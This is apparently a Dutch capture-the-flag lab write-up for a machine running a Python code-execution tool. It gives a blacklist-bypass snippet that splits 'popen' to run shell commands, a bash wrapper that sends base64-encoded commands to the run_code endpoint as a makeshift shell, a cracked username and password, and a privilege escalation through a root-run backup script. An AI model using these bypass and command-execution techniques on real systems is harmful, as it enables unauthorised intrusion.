# Code

Met een poort scan komen we erachter dat er op poort 5000 een python code tool
draait. Hier kan code uitgevoerd worden en mogelijk is hier dus ook een
sandbox-escape achtig iets.

Als snel merk ik dat er veel woorden geblacklist zijn. Bijvoorbeeld de code
`print("os")`, wat vrij onschuldig is returned een error. Creativiteit met het
verwoorden van onze command en met global spelen zorgt ervoor dat we wel code
uit kunnen voeren. 

```python
so=list(globals().values()) 
o=getattr(so,"po"+"pen")("ls")
print(getattr(o,"re"+"ad")())
```

Met een klein bash scriptje waarmee we dit als endpoint aanroepen kunnen we een
poor-mans shell krijgen

```bash
#!/bin/bash

exec() {
    PAYLOAD=$1
    PAYLOAD_B64=$(echo -n $PAYLOAD | base64)

    curl -X POST 'http://10.10.11.62:5000/run_code' -s \
        -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
        -H 'Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIllvdSBtdXN0IGJlIGxvZ2dlZCBpbiB0byB2aWV3IHlvdXIgY29kZXMuIl19XX0.Z-L5UA.I9P8VU4453jZmgJj9d-OTYvGcE8' \
        --data-raw "code=so%3Dlist(globals().values())%5B20%5D%0Ao%3Dgetattr(so%2C%22po%22%2B%22pen%22)(%22echo+-n+%5C%22$PAYLOAD_B64%5C%22+%7C+base64+-d+%7C+%2Fbin%2Fbash%22)%0Aprint(getattr(o%2C%22re%22%2B%22ad%22)())%0A" \
        | jq -r ".output"
}

echo -n "> "
while read input; do
    exec "$input"
    echo -n "> "
done
```

Hiermee kunnen we makkelijk wat dingen testen en code uitvoeren. Toevallig
hiermee ook gelijk de user flag te pakken. Op de server komen we ook een
database file tegen die we naar ons systeem verhuizen om rustig uit te kunnen
pluizen.

In dit bestand vinden we een users tabel en als we de hashes kraken dan krijgen
we de user:

```
martin:nafeelswordmaster
```

SSH is hiermee ook mogelijk :)

# Privesc

Op de server zien we dat we een `backy.sh` script als root kunnen uitvoeren. Dit
script doet wel een paar checks op wat mag qua paden maar met een beetje prutsen
krijgen we het voor elkaar om een backup te maken van de root home folder.
Hiermee ook gelijk de root-flag te pakken.
